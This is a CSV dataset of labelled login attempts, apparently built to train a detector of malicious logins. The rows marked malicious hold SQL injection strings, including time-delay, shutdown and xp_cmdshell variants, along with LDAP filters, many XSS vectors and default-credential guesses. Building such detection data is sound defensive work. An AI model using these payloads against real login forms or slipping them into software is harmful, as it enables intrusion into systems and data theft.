ip,username,password,label
2.138.234.15,zhi,xx3a.FTEair3s,0
175.25.242.170,ying,1/2vista,0
172.109.227.164,PRINT,'hi' or 'x'='x';,1
14.193.35.62,dai,775579.com,0
115.5.54.228,peng,zoioto_83,0
48.238.40.180,tan,@sohu.com4,0
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.pom,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,"<applet onerror applet onerror=""javascript:javascript:alert(337)""></applet onerror>","<a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""javascript:alert(1558);"">XXX</a></a><a href=""javascript:javascript:alert(1558)"">XXX</a>",1
2.138.234.15,zhi,xS3a.FTEair3s,0
175.25.242.170,ying,1/2vista,0
14.193.35.62,dai,775579.com,0
172.109.227.164,!,or,1
48.238.40.180,tan,@sohu.com4S,0
115.5.54.228,peng,zoloto_83,0
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.com,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,"&lt;HEAD&gt;&lt;META HTTP-EQUIV=\""CONTENT-TYPE\"" CONTENT=\""text/html; charset=UTF-7\""&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(915);+ADw-/SCRIPT+AD4-","<;META HTTP-EQUIV="";refresh""; CONTENT="";0;url=javascript:alert(1892);"";>;",1
2.138.234.15,zhi,xx3a.FTEair3s,0
175.25.242.170,ying,1/2vista,0
14.193.35.62,dai,775579.com,0
172.109.227.164,order by,//*,1
115.5.54.228,peng,zoloto_83,0
48.238.40.180,tan,@sohu.com4,0
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.com,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1701)""/>",&lt;IMG SRC=javascript&#058;alert(929)&gt;,1
175.25.242.170,ying,1/2vista,0
2.138.234.15,zhi,xx3a.FTEair3s,0
14.193.35.62,dai,775579.com,0
172.109.227.164,' or 3=3,"hi or 1=1 --""",1
115.5.54.228,peng,zoloto_83,0
48.238.40.180,tan,@sohu.com4,0
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.com,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,"<IMG SRC=x onblur=""alert(1074))"">","<LINK REL=""stylesheet"" HREF=""javascript:alert(1026);"">",1
175.25.242.170,ying,1/2vista,0
2.138.234.15,zhi,xx3a.FTEair3s,0
14.193.35.62,dai,775579.com,0
172.109.227.164,or a = a,"<>""'%;)(&+",1
115.5.54.228,peng,zoloto_83,0
48.238.40.180,tan,@sohu.com4,0
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.com,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,<x onmouseup=alert(171)>click this!,"<IFRAME SRC=# onmouseover=""alert(1145)""></IFRAME>",1
175.25.242.170,ying,1/2vista,0
2.138.234.15,zhi,xx3a.FTEair3s,0
172.109.227.164,""" or ""a""=""a","<>""'%;)(&+",1
14.193.35.62,dai,775579.com,0
48.238.40.180,tan,@sohu.com4,0
115.5.54.228,peng,qzoloto_83,0
240.20.107.70,hao,>ttt@126.com,0
129.113.100.41,cen,@139.com2323,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,"<IMG SRC=x onloadedmetadata=""alert(1115))"">","0\""autofocus/onfocus=alert(993)--><video/poster/onerror=prompt(2)>""-confirm(3)-""",1
2.138.234.15,zhi,xx3a.FTEair3s,0
175.25.242.170,ying,1/2vista,0
14.193.35.62,dai,775579.com,0
172.109.227.164,*(|(mail=*)),@variable,1
115.5.54.228,peng,zoloto_83,0
48.238.40.180,tan,@sohu.com4,0
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.com,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,</TITLE><SCRIPT>alert(736);</SCRIPT>,"perl -e 'print \""&lt;SCR\0IPT&gt;alert(920)&lt;/SCR\0IPT&gt;\"";' &gt; out",1
2.138.234.15,zhi,xx3a.FTEair3s,0
175.25.242.170,ying,T/2vista,0
172.109.227.164,x' OR full_name LIKE '%Bob%,desc,1
14.193.35.62,dai,775579.com,0
48.238.40.180,tan,@sohu.com4,0
115.5.54.228,peng,zoloto_83,0
240.20.107.70,hao,ttt@126.com,0
129.113.100.41,cen,@139.com2323,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,"""`'><script>\xE2\x80\x89javascript:alert(508)</script>",<IMG SRC=javascript:alert(715)>,1
2.138.234.15,zhi,xx3a.FTEair3s,0
175.25.242.170,ying,1/2vista,0
14.193.35.62,dai,775579.com,0
172.109.227.164,like,@variable,1
115.5.54.228,peng,zoloto_83,0
48.238.40.180,tan,@sohu.com4,0
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.com,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,"&lt;DIV STYLE=\""width&#58; expression(alert(898));\""&gt;",<a onmouseover=alert(720)>xxs link</a>,1
175.25.242.170,ying,1/2vista,0
2.138.234.15,zhi,xx3a.FTEar3s,0
14.193.35.62,dai,775579.com,0
172.109.227.164,*(|(mail=*)),' or '1'='1'--,1
115.5.54.228,peng,zolo~to_83,0
48.238.40.180,tan,@sohu.com4,0
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.com,0
2.232.192.8,lang,1%pageu*p,0
254.118.8.201,"<IMG SRC=""javascript:alert(1628);"">","""`'><script>\xE2\x80\x86javascript:alert(533)</script>",1
175.25.242.170,ying,1/2vsta,0
2.138.234.15,zhi,xx3a.FTEair3s,0
172.109.227.164,'sqlattempt1,1 or 1=1,1
14.193.35.62,dai,77557.com,0
115.5.54.228,peng,zol`to_83,0
48.238.40.180,tan,@sohu.com4,0
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.com,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,"<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(967)}),x</script>","""><img src=x onerror=javascript:alert(1459))>",1
175.25.242.170,ying,1/2vista,0
2.138.234.15,zhi,xx3a.FTEair3s,0
14.193.35.62,dai,775579.com,0
172.109.227.164,\x27UNION SELECT,‘ or 1=1 --,1
48.238.40.180,tan,@sohu.com(4,0
115.5.54.228,peng,zoloto_83,0
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.com,0
2.232.192.8,lang,g1%pageup,0
254.118.8.201,<script>/* *\x00/javascript:alert(381)// */</script>,<script>+-+-1167-+-+alert(1167)</script>,1
175.25.242.170,ying,1/2vista,0
2.138.234.15,zhi,xx3a.FTEair3s,0
172.109.227.164,1;SELECT%20*,"hi"") or (""a""=""a",1
14.193.35.62,dai,775579.com,0
48.238.40.180,tan,@sohu.com4,0
213.42.182.130,',' UNION SELECT,1
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.com,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,--><!-- --\x2361> <img src=xxx:x onerror=javascript:alert(361)> -->,"<form><button formaction=""javascript:javascript:alert(1484)"">X",1
82.123.31.224,<body oninput=javascript:alert(1485)><input autofocus>,"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1286);/*';"">DEF",1
2.138.234.15,zhi,xx3a.FTEair3s,0
172.109.227.164,'%20or%20'x'='x,' or 1 --',1
14.193.35.62,dai,775579.com,0
213.42.182.130,order by,' or uname like '%,1
48.238.40.180,tan,@sohu.com4,0
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.com,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,"<;TABLE BACKGROUND="";javascript:alert(1902)"";>;<;/TABLE>;","<a href=""\x447Ajavascript:javascript:alert(447)"" id=""fuzzelement447"">test</a>",1
2.138.234.15,zhi,xx3a.FTEair3s,0
82.123.31.224,"<a href=""javas\x09cript:javascript:alert(377)"" id=""fuzzelement377"">test</a>","<IMG """"""><SCRIPT>alert(1001)</SCRIPT>"">",1
172.109.227.164,' --,'%20or%201=1,1
14.193.35.62,dai,775579.com,0
213.42.182.130,'%20or%201=1,' (select top 1,1
48.238.40.180,tan,@sohu.com4,0
129.113.100.41,cen,@139.com2323,0
240.20.107.70,hao,ttt@126.com,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,"<script\x09type=""text/javascript"">javascript:alert(403);</script>","<html onmouseover html onmouseover=""javascript:javascript:alert(1241)""></html onmouseover>",1
2.138.234.15,zhi,xx3a.FTEair3s,0
82.123.31.224,"<img\x607607src=x onerror=""javascript:alert(607)"">","<html onMouseOut html onMouseOut=""javascript:javascript:alert(1227)""></html onMouseOut>",1
14.193.35.62,dai,775579.com,0
172.109.227.164,anything' OR 'x'='x,PRINT,1
213.42.182.130,desc,\x27\x6F\x72 SELECT *,1
48.238.40.180,tan,@s/hu.com4,0
240.20.107.70,hao,ttt@126.com,0
129.113.100.41,cen,@139.com2323,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(387);/*';"">DEF","<div id=""div584""><input value=""``onmouseover=javascript:alert(584)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div584"").innerHTML;</script>",1
82.123.31.224,&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(1837)&lt;/SCRIPT&gt;&quot;&gt;,"<img src=x onerror=\x15432""javascript:alert(1543)"">",1
120.33.22.190,123456,Congress,1
222.73.171.162,gan,sunrise1%,0
14.193.35.62,dai,775579.com,0
213.42.182.130,a' waitfor delay '0:0:10'--,'sqlattempt1,1
48.238.40.180,tan,@sohu.com4,0
240.20.107.70,hao,ttt@126.com,0
129.113.100.41,cen,@139.com2323,0
2.232.192.8,lang,1%pageup,0
254.118.8.201,"<a onmouseover=""alert(1633)"">xxs link</a>",&lt;BR SIZE=&quot;&amp;{alert(1838)}&quot;&gt;,1
120.33.22.190,123456,INGRES,1
82.123.31.224,<svg onload=eval(URL.slice(-8))>#alert(93),"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1198)""></frameset onScroll>",1
222.73.171.162,gan,sunrise1%,0
14.193.35.62,dai,775579.com,0
213.42.182.130,&apos;%20OR,') or ('a'='a,1
48.238.40.180,sha,004e-mail,0
129.113.100.41,cen,"@139.co,m2323",0
141.114.5.104,%26,limit,1
254.118.8.201,<body onscroll=alert(145)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><x id=x>#x,<;/script>;<;script>;alert(1928)<;/script>;,1
2.232.192.8,lang,1%pageup,0
120.33.22.190,123456,DECMAIL,1
82.123.31.224,"<DIV STYLE=""background-image: url(javascript.:alert(257))"">",<script\x0C>javascript:alert(551)</script>,1
14.193.35.62,dai,775579.com,0
222.73.171.162,gan,sunrise1%,0
213.42.182.130,"hi"" or ""a""=""a",x' OR full_name LIKE '%Bob%,1
48.238.40.180,sha,004e-mailo,0
123.222.62.92,"<iframe onload iframe onload=""javascript:javascript:alert(340)""></iframe onload>",&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(1814);&quot;&gt;&lt;/FRAMESET&gt;,1
141.114.5.104,&lt;&gt;&quot;'%;)(&amp;+,\x27,1
2.232.192.8,lang,1%pageup,0
254.118.8.201,"<applet onerror applet onerror=""javascript:javascript:alert(337)""></applet onerror>","&lt;INPUT TYPE=\""IMAGE\"" SRC=\""javascript&#058;alert(880);\""&gt;",1
82.123.31.224,"<IMG SRC=x oncontextmenu=""alert(1076))"">","<;BASE HREF="";javascript:alert(1876);//"";>;",1
120.33.22.190,123456,guestgue,1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,gan,sunrise1%,0
48.238.40.180,sha,004e-mail,0
213.42.182.130,bfilename,',1
123.222.62.92,"<TABLE BACKGROUND=""javascript:alert(760)"">","';alert(934))//\';alert(934))//"";alert(934))//\"";alert(934))//--></SCRIPT>"">'><SCRIPT>alert(934))</SCRIPT>",1
141.114.5.104,"""' or 1 --'""",\x23,1
254.118.8.201,"'`""><\x3Cscript>javascript:alert(1291)</script>","<BODY BACKGROUND=""javascript:alert(1652)"">",1
2.232.192.8,lang,1%pageup,0
82.123.31.224,<img src=javascript:alert(855)>,"<DIV STYLE=""background-image: url(&#1;javascript:alert(1677))"">",1
120.33.22.190,123456,Admin@huawei,1
222.73.171.162,gan,sunrise1%,0
163.179.197.8,ruan,2001asdfjkl;,0
213.42.182.130,",@variable",delete,1
48.238.40.180,sha,004e-mail,0
123.222.62.92,"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1209)""></html onMouseWheel>","<iframe onload iframe onload=""javascript:javascript:alert(1239)""></iframe onload>",1
141.114.5.104,declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),*/*,1
2.232.192.8,lang,1%pageup,0
254.118.8.201,"<img src=x onerror=\x628628""javascript:alert(628)"">","`""'><img src=xxx:x onerror\x00=javascript:alert(555)>",1
82.123.31.224,"a=""get"";b=""URL"";c=""javascript:"";d=""alert(1771);"";eval(a+b+c+d);",a.jsp/<script>alert(232)</script>,1
120.33.22.190,123456,MGR,1
163.179.197.8,ruan,2001asdfjl;,0
222.73.171.162,gan,sunrise1%,0
213.42.182.130,' AnD '' like ',%26,1
48.238.40.180,sha,004e-mail,0
123.222.62.92,"<div/onmouseover='alert(796)'> style=""x:"">","&lt;STYLE TYPE=\""text/javascript\""&gt;alert(903);&lt;/STYLE&gt;",1
141.114.5.104,' or userid like '%,hi' or 1=1 --,1
2.232.192.8,lang,1%pageup,0
254.118.8.201,<IMG SRC=&{javascript:alert(707);};>,"<img src=""javascript:alert(1501)"">",1
120.33.22.190,123456,gen1,1
82.123.31.224,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(678);"">","<html onMouseUp html onMouseUp=""javascript:javascript:alert(1200)""></html onMouseUp>",1
222.73.171.162,gan,sunrise1%,0
163.179.197.8,ruan,2001asdfjkl;,0
213.42.182.130,\x27UNION SELECT,hi' or 'a'='a,1
48.238.40.180,sha,004e-mail,0
123.222.62.92,"<embed src=""javascript:alert(1500)"">",<video poster=javascript:javascript:alert(1479)//,1
141.114.5.104,//,'%20or%20''=',1
2.232.192.8,lang,C1%pageup,0
254.118.8.201,&lt;BODY ONLOAD=alert(1810)&gt;,"<IMG SRC="" &#14;  javascript:alert(1011);"">",1
82.123.31.224,"0&q=';alert(863))//\';alert%2?8863))//"";alert(String.fromCharCode?(88,83,83))//\"";alert(863)%?29//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search","<a onmouseover=""alert(719)"">xxs link</a>",1
120.33.22.190,123456,wampp,1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,gan,sunrise1%,0
213.42.182.130,or 1=1--,--sp_password,1
48.238.40.180,sha,004e-mail,0
123.222.62.92,"ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(426)"">DEF",</TITLE><SCRIPT>alert(736);</SCRIPT>,1
141.114.5.104,' and '' like ',t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
2.232.192.8,ran,idcb_2010,0
254.118.8.201,&lt;IMG LOWSRC=&quot;javascript:alert(1820);&quot;&gt;,"<a href=""\xE2\x81383\x9Fjavascript:javascript:alert(1383)"" id=""fuzzelement1383"">test</a>",1
120.33.22.190,123456,speedxess,1
82.123.31.224,"""`'><script>\xEF\xBF\xAEjavascript:alert(526)</script>","<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1550)></a>"">",1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,gan,sunrise1%,0
213.42.182.130,""" or 1=1--","<>""'%;)(&+",1
48.238.40.180,sha,004e-mail,0
123.222.62.92,"<LINK REL=""stylesheet"" HREF=""javascript:alert(1659);"">","""+alert(16)+""",1
141.114.5.104,desc,@variable,1
2.232.192.8,ran,id_2010,0
254.118.8.201,&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(1816);&quot;&gt;,<BODY ONLOAD=alert(1656)>,1
82.123.31.224,"""/><img/onerror=\x09javascript:alert(540)\x09src=xxx:x />","<a href=""\x0Fjavascript:javascript:alert(435)"" id=""fuzzelement435"">test</a>",1
120.33.22.190,prtgadmin,fal,1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,gan,sunrise1%,0
48.238.40.180,sha,004e-mail,0
213.42.182.130,handler,or 0=0 #,1
123.222.62.92,"<img \x6012src=x onerror=""javascript:alert(601)"">","""`'><script>\xE2\x80\x84javascript:alert(1404)</script>",1
141.114.5.104,= ;,declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
2.232.192.8,ran,idc_2010,0
254.118.8.201,"<TABLE BACKGROUND=""javascript:alert(949)"">","<;IMG SRC="";javascript:alert(1924)"";",1
82.123.31.224,<BODY ONLOAD=alert(864)>,"`""'><img src=xxx:x onerror\x00=javascript:alert(1469)>",1
120.33.22.190,prtgadmin,guardone,1
222.73.171.162,gan,sunrise1%,0
163.179.197.8,ruan,2001asdfjkl;,0
213.42.182.130,insert,' (select top 1,1
48.238.40.180,sha,004e-mail,0
123.222.62.92,"<embed src=""javascript:alert(963)"">","></SCRIPT>"">'><SCRIPT>alert(713))</SCRIPT>",1
141.114.5.104,""" or ""a""=""a",'||UTL_HTTP.REQUEST,1
13.214.174.167,cui,80586ghjkl;,0
2.232.192.8,ran,idc_2010,0
82.123.31.224,"<IMG SRC=x ondrop=""alert(1101))"">","""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(387);/*';"">DEF",1
120.33.22.190,prtgadmin,password123,1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,gan,sunrise1%,0
213.42.182.130,'hi' or 'x'='x';,' or 1=1,1
48.238.40.180,sha,004e-mail,0
123.222.62.92,"<html onMouseOut html onMouseOut=""javascript:javascript:alert(328)""></html onMouseOut>","perl -e 'print \""&lt;SCR\0IPT&gt;alert(920)&lt;/SCR\0IPT&gt;\"";' &gt; out",1
141.114.5.104,#,#,1
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,80586ghjkl;,0
82.123.31.224,"<script\x0Dtype=""text/javascript"">javascript:alert(402);</script>",XSS STYLE=xss:e/**/xpression(alert(1940))>,1
120.33.22.190,prtgadmin,qsecofr,1
163.179.197.8,ruan,2001asdfjk[l;,0
222.73.171.162,gan,sunrise1%,0
213.42.182.130,' or 0=0 #,' or 1=1 or ''=',1
48.238.40.180,sha,004e-mail,0
141.114.5.104,),insert,1
123.222.62.92,"<IMG """"""><SCRIPT>alert(1001)</SCRIPT>"">","<IMG SRC=x onload=""alert(1132))"">",1
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,80586ghjkl;,0
82.123.31.224,&lt;&lt;SCRIPT&gt;alert(917);//&lt;&lt;/SCRIPT&gt;,<svg><script onlypossibleinopera:-)> alert(1706),1
120.33.22.190,prtgadmin,DBA!sa@EMSDB123,1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,gan,sunrise1%,0
48.238.40.180,sha,004e3-mail,0
213.42.182.130,//,';shutdown--,1
123.222.62.92,"<iframe onload=location=['javascript:alert(79)'].join("")>","<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA[cript:javascript:alert(1620);"">]]</C><X></xml>",1
141.114.5.104,%28,(,1
2.232.192.8,ran,idc@2010,0
13.214.174.167,cui,80586Hhjkl;,0
82.123.31.224,<brute contenteditable onkeyup=alert(184)>press any key!,<math><brute xlink:href=javascript:alert(218)>click,1
120.33.22.190,prtgadmin,dare,1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,gan,sunrise1%,0
213.42.182.130,),1 or 1=1,1
48.238.40.180,sha,004e-mail,0
123.222.62.92,foo<script>alert(847)</script>,"<img src=x\x09onerror=""javascript:alert(1534)"">",1
141.114.5.104,x' or 1=1 or 'x'='y,' --,1
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,80586ghjkl;,0
120.33.22.190,prtgadmin,1234admin,1
82.123.31.224,"`""'><img src=xxx:x \x0Aonerror=javascript:alert(491)>","<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(347)""></iframe onbeforeload>",1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,gan,sunrise1%,0
213.42.182.130,%2A%7C,' or 1=1 or ''=',1
48.238.40.180,sha,004e-mail,0
123.222.62.92,<script>javascript:alert(355)</script\x0A,<frameset onload=javascript:alert(1487)>,1
141.114.5.104,bfilename,%2A%7C,1
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,80586ghjkl;,0
120.33.22.190,prtgadmin,secure,1
82.123.31.224,"<IMG SRC=x onkeydown=""alert(1083))"">","<a href=""\x485Cjavascript:javascript:alert(485)"" id=""fuzzelement485"">test</a>",1
222.73.171.162,gan,sunrise1%,0
163.179.197.8,ruan,2001asdfjkl;,0
213.42.182.130,' UNION ALL SELECT,hi or a=a,1
48.238.40.180,sha,004e-mail,0
123.222.62.92,<svg onload=eval(URL.slice(-8))>#alert(93),"ABC<div style=""x:\x0Bexpression(javascript:alert(430)"">DEF",1
141.114.5.104,' or uid like '%,' or 'x'='x,1
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,80586ghjkl;,0
120.33.22.190,prtgadmin,sertafu,1
82.123.31.224,"<BASE HREF=""javascript:javascript:alert(691);//"">",xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(902))'&gt;,1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,gan,sunrise1%,0
48.238.40.180,sha,004e-mail,0
213.42.182.130,x' OR full_name LIKE '%Bob%,'sqlattempt1,1
123.222.62.92,"<script\x3Etype=""text/javascript"">javascript:alert(1178);</script>","<img \x47src=x onerror=""javascript:alert(599)"">",1
141.114.5.104,' AnD '' like ',' UNION ALL SELECT,1
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,80586ghjkl;,0
82.123.31.224,"<IMG SRC=x oncontextmenu=""alert(1076))"">",<brute contenteditable onkeyup=alert(184)>press any key!,1
120.33.22.190,PROG,7777777,1
163.179.197.8,ruan,201asdfjkl;,0
222.73.171.162,gan,sunrise1%,0
213.42.182.130,handler,*/*,1
48.238.40.180,sha,004e-mail,0
141.114.5.104,"hi"" or ""a""=""a",&apos;%20OR,1
123.222.62.92,<brute oncut=alert(177)>copy this!,"<meta charset=""mac-farsi"">¼script¾javascript:alert(1566)¼/script¾",1
13.214.174.167,cui,80586ghjkl;,0
2.232.192.8,ran,idc_2010,0
82.123.31.224,"<a href=""javas\x01273cript:javascript:alert(1273)"" id=""fuzzelement1273"">test</a>","<!--<img src=""--><img src=x onerror=javascript:alert(575)//"">",1
120.33.22.190,PROG,123qweasd,1
222.73.171.162,gan,sunrise1%,0
163.179.197.8,ruan,2001asdfjkl;,0
213.42.182.130,‘ or 1=1 --,0 or 1=1,1
48.238.40.180,sha,004e-mail,0
123.222.62.92,"<a href=""\x13559javascript:javascript:alert(1355)"" id=""fuzzelement1355"">test</a>",<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(1865))>,1
141.114.5.104,--,"""",1
13.214.174.167,cui,80586ghjkl,0
2.232.192.8,ran,idc_2010,0
82.123.31.224,</TITLE><SCRIPT>alert(1650);</SCRIPT>,"'`""><\x00script>javascript:alert(286)</script>",1
120.33.22.190,PROG,password123,1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,le,asdf_123,0
213.42.182.130,char%4039%41%2b%40SELECT,&apos;%20OR,1
48.238.40.180,sha,004e-mail,0
123.222.62.92,<script\x0A>javascript:alert(1449)</script>,<script\x0A>javascript:alert(550)</script>,1
141.114.5.104,\x3D \x27,procedure,1
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,80586ghjkl;,0
120.33.22.190,PROG,test2,1
82.123.31.224,"&#00;</form><input type&#6816;""date"" onfocus=""alert(816)"">","<IMG SRC=x onmouseout=""alert(1090))"">",1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,le,asdf_123,0
213.42.182.130,handler,*|,1
48.238.40.180,sha,004e-mail,0
123.222.62.92,"<IMG LOWSRC=""javascript:javascript:alert(673)"">","""/><img/onerror=\x60javascript:alert(545)\x60src=xxx:x />",1
141.114.5.104,‘ or 3=3 --,"""",1
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,80586ghjkl;,0
180.200.205.42,qian,black1/8,0
120.33.22.190,PROG,qwertyuiop.,1
222.73.171.162,le,asdf_123,0
163.179.197.8,ruan,2001asdfjkl;,0
48.238.40.180,sha,004e-mail,0
213.42.182.130,'hi' or 'x'='x';,',1
141.114.5.104,')%20or%20('x'='x,';shutdown--,1
123.222.62.92,´óÐ¡Ð´»ìÏýÈÆ¹ý£º<ScRipt>alert(5)</script>,"<div id=""div1498""><input value=""``onmouseover=javascript:alert(1498)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1498"").innerHTML;</script>",1
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,8058~ghjkl;,0
120.33.22.190,PROG,riverhead,1
180.200.205.42,qian,black1/8,0
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,le,asdf_123,0
213.42.182.130,hi') or ('a'='a,' or user like '%,1
48.238.40.180,sha,004e-mail,0
190.251.49.91,or%201=1 --,limit,1
141.114.5.104,x' OR full_name LIKE '%Bob%,' or 1=1 or ''=',1
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,80586ghjkl;,0
180.200.205.42,qian,black1/8,0
120.33.22.190,PROG,hawk201,1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,le,asdf_123,0
195.61.244.134,ding,##ol2345678,0
48.238.40.180,sha,004e-mail,0
190.251.49.91,%20'sleep%2050',|,1
141.114.5.104,*(|(objectclass=*)),or,1
13.214.174.167,cui,80586ghjkl;,0
2.232.192.8,ran,idc_2010,0
180.200.205.42,qian,black1/8,0
120.33.22.190,PROG,CTX_123,1
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,le,asdf_123,0
195.61.244.134,ding,##ol2345678,0
48.238.40.180,sha,004e-mail,0
190.251.49.91,or 1=1--,x' AND userid IS NULL; --,1
141.114.5.104,%7C,' or username like '%,1
13.214.174.167,cui,80586ghjkl;,0
2.232.192.8,ran,idc_2010,0
120.33.22.190,PROG,OPER,1
180.200.205.42,qian,black1/8,0
163.179.197.8,ruan,2001asdfjkl;,0
222.73.171.162,le,asdf_123,0
195.61.244.134,ding,##ol2345678,0
48.238.40.180,sha,004e-mail,0
190.251.49.91,= ;,""" or 0=0 --",1
141.114.5.104,"<>""'%;)(&+",declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,80586ghjkl;,0
120.33.22.190,administrator,POWERCARTUSER,1
180.200.205.42,qian,black1/8,0
110.30.160.223,lin,10%sugar,0
222.73.171.162,le,asdf_123,0
195.61.244.134,ding,##ol2345678,0
48.238.40.180,sha,004e-mail,0
190.251.49.91,as,"""a"""" or 1=1--""",1
205.237.203.110,cao,101@qq.com,0
2.232.192.8,ran,idc_2010,0
13.214.174.167,cui,80586ghjkl;,0
120.33.22.190,administrator,Fireport,1
180.200.205.42,qian,black1/8,0
110.30.160.223,lin,10%sugar,0
222.73.171.162,le,asdf_123,0
195.61.244.134,ding,##ol234568,0
48.238.40.180,sha,004e-mail,0
